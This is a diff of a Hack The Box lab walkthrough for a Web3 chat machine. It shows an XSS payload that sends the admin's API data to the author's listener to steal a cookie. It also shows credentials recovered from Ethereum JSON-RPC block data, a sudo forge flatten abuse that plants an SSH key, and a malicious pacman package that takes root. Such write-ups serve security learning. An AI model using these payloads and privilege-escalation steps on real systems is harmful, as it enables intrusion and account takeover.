@@ -5,20 +5,20 @@ draft: true
 description: "Awesome Walkthrough"
 tags: ["Hard", "Linux", "Hack The Box", "hacking", "Web3", "BLock Chain", "Walkthrough"]
 ---
-## Reconnaissance #Linux 
-- Got two ports open 80 and ssh
-- 
+## Reconnaissance 
+- Got two ports open 80 and ssh 
 - First impression of the web is, It is a Web3 and a chat app
-- ![[Pasted image 20250106030842.png]]
+![Pasted image 20250106030842.png]()
 - The page using Ethereum
-- ![[Pasted image 20250105224629.png]]
+![Pasted image 20250105224629.png]()
 - Interesting isn't it, Created a account and logged in 
 - Has a secure and cool place to chat
-- ![[Pasted image 20250106000441.png]]
+![Pasted image 20250106000441.png]()
 - The chats data are stored using Ethereum in Blocks
 - Scooped around a little bit and found `/admin` page but with no access for us
 - The "Report User" button seems little suspicious cause the website is well built but not the report button
-- ![[Pasted image 20250106000810.png]]
+![Pasted image 20250106000810.png]()
+
 ## Enumeration
 - Turns out the `Report User` button functionality is vulnerable to XSS
 - The stupid admin is clicking around the links. 
@@ -28,18 +28,18 @@ tags: ["Hard", "Linux", "Hack The Box", "hacking", "Web3", "BLock Chain", "Walkt
 <img src=x onerror="fetch('http://10.10.11.43/api/info').then(response => {return response.text();}).then(dataFromA => {return fetch(`http://10.10.14.12:8000/?d=${dataFromA}`)})">
 ```
 - This payload fetches data from the request to the `/api/info` and returns it to my server
-- ![[Pasted image 20250106001445.png]]
+![Pasted image 20250106001445.png]()
 - Got the admin cookie and accessed the `/admin` page.
 - In the Source of admin page found interesting endpoints
-- ![[Pasted image 20250106001604.png]]
+![Pasted image 20250106001604.png]()
 - This `json-rpc` endpoint can query more stuff
 - This [Documentation](https://ethereum.org/en/developers/docs/apis/json-rpc/) has more info about the stuffs that can be done with this endpoint
 - But particularly this one catches my attention
-- ![[Pasted image 20250106002345.png]]
+![Pasted image 20250106002345.png]()
 - This parameter `eth_blockNumber` gets the recent block that saved have been saved.
 - I tested the endpoint `json-rpc` with this `eth_blockNumber`
 - Seems the value next to the `params` value is a boolean
-- ![[Pasted image 20250106002939.png]]
+![Pasted image 20250106002939.png]()
 - The `Params` value is the the value for the block.
 - This request data's response seemed interesting
 - **Request**
@@ -58,14 +58,15 @@ tags: ["Hard", "Linux", "Hack The Box", "hacking", "Web3", "BLock Chain", "Walkt
 "params":["0xi",true]
 ```
 - Likewise got a `input` value
-- ![[Pasted image 20250106003937.png]]
+![Pasted image 20250106003937.png]()
 - After trying many Ethereum input data Decoders online, It seemed like hex to me so decoded it using with the help of Cyberchef and got password and username from it.
-- ![[Pasted image 20250106004230.png]]
+![Pasted image 20250106004230.png]()
 - So logged in using SSH and got the user flag
-- ![[Pasted image 20250106004313.png]]
+![Pasted image 20250106004313.png]()
+
 ## Privilege Escalation
 - It seems the user keira can run sudo a user paul with a binary
-- ![[Pasted image 20250106004658.png]]
+![Pasted image 20250106004658.png]()
 - `forge` is the command-line interface (CLI) tool for interacting with a specific framework or environment. It could relate to tools like `Foundry` for Ethereum development or any other CLI-based tool with the name `forge`
 - After hours of research found that we can use `flatten` option using forge to write something .
 -  When someone login in SSH using private key, SSH checks the authenticity of the key with its public key on the system.
@@ -75,7 +76,7 @@ tags: ["Hard", "Linux", "Hack The Box", "hacking", "Web3", "BLock Chain", "Walkt
 ```
 ssh-keygen
 ```
-- ![[Pasted image 20250107181255.png]]
+![Pasted image 20250107181255.png]()
 - **Step-2**
 	- Copy the public key of user `keira` to the `/tmp` folder and Give all necessary permissions.
 ```
@@ -85,21 +86,22 @@ cp .ssh/id_ed25519.pub /tmp/pub
 ```
 chmod 644 /tmp/pub
 ```
-![[Pasted image 20250107183317.png]]
+![Pasted image 20250107183317.png]()
+
 - **Step-3**
 - Exploit using the `flatten` option to write the public to the user `paul`'s home directory in the `.ssh/authorized_keys` file
-```
+```bash
 sudo -u paul /home/paul/.foundry/bin/forge flatten /tmp/pub -o /home/paul/.ssh/authorized_keys
 ```
-![[Pasted image 20250107183403.png]]
+![Pasted image 20250107183403.png]()
 - **Step-4**
 - Now share the private key to the host system and login using the private key as user `paul`
-```
+```bash
 python3 -m http.server --directory .ssh/
 ```
-- ![[Pasted image 20250107183432.png]]
+![Pasted image 20250107183432.png]()
 - Got access as user `paul`
-- ![[Pasted image 20250107183526.png]]
+![Pasted image 20250107183526.png]()
 - As we can see user `paul` has SUDO privilege to run `pacman`
 - To exploit this, create a own malicious package and install it using pacman.
 - Initially I was struggling cause of my malicious package not working as intended.
@@ -145,9 +147,9 @@ echo "Don't forget to secure your private key: id_rsa
 - The malicious code will replace the `root` user's `authorized_keys` file with our public key
 - Script also creates the ssh keys of our system in the current directory with no password and then it renamed the public key name to `authorized_keys`
 - It executes this command `makepkg`. Which will compile the malicious  package with our public key `authorized_keys`
-- ![[Pasted image 20250107185332.png]]
+![Pasted image 20250107185332.png]()
 - Transfer this malicious package to the target system and install it using `sudo`
-- ![[Pasted image 20250107185451.png]]
+![Pasted image 20250107185451.png]()
 - On the host system give all the necessary permissions to our private key and use it to login
 - System rooted successfully.
-- ![[Pasted image 20250107185638.png]]
+![Pasted image 20250107185638.png]()
